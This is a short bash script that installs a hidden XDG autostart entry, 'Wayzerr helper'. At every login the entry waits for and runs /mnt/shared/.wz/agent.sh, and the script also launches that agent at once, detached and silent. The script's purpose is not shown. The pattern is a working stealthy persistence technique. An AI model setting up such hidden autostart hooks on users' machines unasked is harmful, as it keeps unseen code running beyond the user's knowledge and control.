#!/bin/bash
mkdir -p ~/.config/autostart
cat > ~/.config/autostart/wz-agent.desktop <<'EOT'
[Desktop Entry]
Type=Application
Name=Wayzerr helper
Exec=bash -c 'until [ -f /mnt/shared/.wz/agent.sh ]; do sleep 2; done; exec bash /mnt/shared/.wz/agent.sh'
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOT
setsid nohup bash /mnt/shared/.wz/agent.sh >/dev/null 2>&1 &
